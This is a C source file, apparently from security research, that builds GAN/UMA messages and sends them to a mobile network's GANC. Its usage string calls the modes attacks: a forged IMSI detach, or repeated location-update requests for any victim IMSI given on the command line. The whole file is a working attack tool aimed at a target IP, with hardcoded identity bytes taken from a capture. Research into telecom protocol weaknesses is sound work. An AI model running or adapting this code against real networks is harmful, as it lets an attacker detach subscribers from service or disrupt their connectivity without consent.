/*
 * Create IMSI DETACH/LOC UPDATE GAN payloads to be sent to GANC
 * -------------------------------------------------------------------------
 * "THE BEER-WARE LICENSE" (Revision 42):
 * Nico Golde <nico@ngolde.de> wrote this file. As long as you retain this
 * notice you can do whatever you want with this stuff. If we meet some day,
 * and you think this stuff is worth it, you can buy me a beer in return.
 * -------------------------------------------------------------------------
 */

#include <stdio.h>
#include <stdlib.h>
#include <sys/types.h>
#include "uma_msg.h"
#include "ga_types.h"
#include <netinet/in.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <unistd.h>
#include <string.h>

#define UMA_PORT 14001

struct imsi {
    unsigned char *imsi;
    uint8_t len;
};

struct imsi *imsi_encode(char *arg){
    struct imsi *im = malloc(sizeof(struct imsi));
    unsigned char *rimsi = alloca(32);
    unsigned char c = 0;
    unsigned char *ptr;
    int i = 0;

    im->imsi = malloc(32);
    ptr = im->imsi;

    memset(im->imsi, 0, 32);

    /* 9 is adding the identity type msisdn */
    snprintf(rimsi, 32, "9%s", arg);
    arg = rimsi;
    im->len = strlen(rimsi) / 2 + strlen(rimsi) % 2;

    for(i=0; i<strlen(arg); i++){
        if(i % 2 == 1){
            c |= (arg[i] - 48) << 4;
            *ptr = c;
            c = 0;
            ptr++;
        } else {
            c |= (arg[i] - 48);
        }
    }
    for(i = 0; i<strlen(arg)/2; i++){
        printf("%x ", im->imsi[i]);
    }

    printf("\n");

    return im;
}

void location_update(int sock, struct imsi *im, int times){
        int i,j, len = 0;
        u_int8_t *titi, *tata;
        u_int8_t tem[610];
        struct uma_msg_s *uma_msg;

        uma_msg = uma_create_msg(GA_RC_REGISTER_REQUEST ,0,GA_RC);
        /* bc hex data for our own imsi, directly taken from wireshark hexdump */
        uma_msg->tlv[uma_msg->ntlv++] = create_IEI_Mobile_Identity("\x29\x80\x01\x43\x88\x88\x59\x02",8);
        uma_msg->tlv[uma_msg->ntlv++] = create_IEI_GAN_Release_Indicator(1);
        uma_msg->tlv[uma_msg->ntlv++] = create_IEI_GAN_Classmark(7,1,1,0,0,0);
        uma_msg->tlv[uma_msg->ntlv++] = create_IEI_Radio_Identity(0,"\x00\x1b\x67\x00\xa9\xaf\x60");
        uma_msg->tlv[uma_msg->ntlv++] = create_IEI_MS_Radio_Identity(0,"\x00\x1b\x67\x00\xa9\xaf\x60");
        uma_msg->tlv[uma_msg->ntlv++] = create_IEI_GSM_RR_UTRAN_RRC_State(7);
        uma_msg->tlv[uma_msg->ntlv++] = create_IEI_GERAN_UTRAN_coverage_Indicator(6);
        j = uma_create_buffer(&titi,uma_msg);

        for(i = 0; i < uma_msg->ntlv; i++){
                tlv_printf(uma_msg->tlv[i]);
        }

        write(sock, titi, j);

        for(i = 0; i < j; i++){
                printf("%02x ",titi[i]);
        }
        uma_delete_msg(uma_msg);

        sleep(2);

        uma_msg = uma_create_msg(GA_CSR_REQUEST ,0, GA_CSR);
        uma_msg->tlv[uma_msg->ntlv++] = create_IEI_Establishment_Cause(13);
        j = uma_create_buffer(&titi,uma_msg);

        for(i = 0; i < uma_msg->ntlv; i++){
                tlv_printf(uma_msg->tlv[i]);
        }

        write(sock, titi, j);

        for(i = 0; i < j; i++){
                printf("%02x ",titi[i]);
        }
        uma_delete_msg(uma_msg);

        sleep(2);

        uma_msg = uma_create_msg(GA_CSR_UPLINK_DIRECT_TRANSFER,0, GA_CSR);

        unsigned char l3[256];
        memset(l3, 0, sizeof(l3));

        memcpy(l3, "\x05\x08\x02\x02\xf8\x11\xff\xfc\x57\x08", sizeof("\x05\x08\x02\x02\xf8\x11\xff\xfc\x57\x08") - 1);
        len += sizeof("\x05\x08\x02\x02\xf8\x11\xff\xfc\x57\x08") - 1;
        memcpy(l3 + len , im->imsi, im->len);
        len += im->len;
        memcpy(l3 + len, "\x33\x03\x57\x58\xa2", sizeof("\x33\x03\x57\x58\xa2") - 1);
        len += sizeof("\x33\x03\x57\x58\xa2") - 1;

        uma_msg->tlv[uma_msg->ntlv++] = create_IEI_L3_Message(l3, len);
        j = uma_create_buffer(&titi,uma_msg);

        for(i = 0; i < uma_msg->ntlv; i++){
                tlv_printf(uma_msg->tlv[i]);
        }

        for(i = 0; i < times; i++){
            printf("Sending location update request: %d\n", i);
            write(sock, titi, j);
            sleep(1);
        }

        for(i = 0; i < j; i++){
                printf("%02x ",titi[i]);
        }
        uma_delete_msg(uma_msg);

        sleep(2);
}

void imsi_detach(int sock, struct imsi *im){
        int i,j;
        u_int8_t *titi, *tata;
        u_int8_t tem[610];
        struct uma_msg_s *uma_msg;
        int len=0;

        uma_msg = uma_create_msg(GA_RC_REGISTER_REQUEST ,0,GA_RC);
        /* bc hex data for our own imsi, directly taken from wireshark hexdump */
        uma_msg->tlv[uma_msg->ntlv++] = create_IEI_Mobile_Identity("\x29\x80\x01\x43\x88\x88\x59\x02",8);
        uma_msg->tlv[uma_msg->ntlv++] = create_IEI_GAN_Release_Indicator(1);
        uma_msg->tlv[uma_msg->ntlv++] = create_IEI_GAN_Classmark(7,1,1,0,0,0);
        uma_msg->tlv[uma_msg->ntlv++] = create_IEI_Radio_Identity(0,"\x00\x1b\x67\x00\xa9\xaf\x60");
        uma_msg->tlv[uma_msg->ntlv++] = create_IEI_MS_Radio_Identity(0,"\x00\x1b\x67\x00\xa9\xaf\x60");
        uma_msg->tlv[uma_msg->ntlv++] = create_IEI_GSM_RR_UTRAN_RRC_State(7);
        uma_msg->tlv[uma_msg->ntlv++] = create_IEI_GERAN_UTRAN_coverage_Indicator(6);
        j = uma_create_buffer(&titi,uma_msg);

        for(i = 0; i < uma_msg->ntlv; i++){
                tlv_printf(uma_msg->tlv[i]);
        }

        write(sock, titi, j);

        for(i = 0; i < j; i++){
                printf("%02x ",titi[i]);
        }
        uma_delete_msg(uma_msg);

        sleep(2);

        uma_msg = uma_create_msg(GA_CSR_REQUEST ,0, GA_CSR);
        uma_msg->tlv[uma_msg->ntlv++] = create_IEI_Establishment_Cause(13);
        j = uma_create_buffer(&titi,uma_msg);

        for(i = 0; i < uma_msg->ntlv; i++){
                tlv_printf(uma_msg->tlv[i]);
        }

        write(sock, titi, j);

        for(i = 0; i < j; i++){
                printf("%02x ",titi[i]);
        }
        uma_delete_msg(uma_msg);

        sleep(2);

        uma_msg = uma_create_msg(GA_CSR_UPLINK_DIRECT_TRANSFER,0, GA_CSR);

        unsigned char l3[256];

        /* mobile identity type */
        memset(l3, 0, sizeof(l3));

        /* MM message, classmark 1 with ES IND */
        memcpy(l3, "\x05\x01\x57", sizeof("\x05\x01\x57") - 1);
        len+=sizeof("\x05\x01\x57") - 1;
        /* identity len, odd number of digits, type imsi */
        memcpy(l3+len, &im->len, 1);
        len++;
        memcpy(l3+len, im->imsi, im->len);
        len+=im->len;
                                                                                                    // 262019039111116
        uma_msg->tlv[uma_msg->ntlv++] = create_IEI_L3_Message(l3, len);
        j = uma_create_buffer(&titi,uma_msg);

        for(i = 0; i < uma_msg->ntlv; i++){
                tlv_printf(uma_msg->tlv[i]);
        }

        write(sock, titi, j);

        for(i = 0; i < j; i++){
                printf("%02x ",titi[i]);
        }
        uma_delete_msg(uma_msg);

        sleep(2);
}
int main(int argc, char **argv)
{
        int sock;
        struct sockaddr_in cs;
        struct imsi *im;

        if(argc < 4){
            fprintf(stderr, "%s <target ip> <imsi> <attack (l - location update / d - imsi detach)\n", argv[0]);
            return -1;
        }

        im = imsi_encode(argv[2]);

        cs.sin_family = AF_INET;
        cs.sin_port = htons(UMA_PORT);
        cs.sin_addr.s_addr = inet_addr(argv[1]);
        if(-1 == cs.sin_addr.s_addr){
            return -2;
        }

        if(-1 == (sock = socket(cs.sin_family, SOCK_STREAM, 0))){
            perror("socket()");
            return -3;
        }

        if(0 > connect(sock, (struct sockaddr*) &cs, sizeof(struct sockaddr_in))){
            return -4;
        }

        switch(argv[3][0]){
            case 'l':
                if(argc < 5){
                    location_update(sock, im, 1);
                } else {
                    location_update(sock, im, strtol(argv[4], NULL, 10));
                }
                break;
            case 'd':
                imsi_detach(sock, im);
                break;
            default:
                printf("unknown attack type\n");
                break;
        }

        printf("\n");
        close(sock);
}

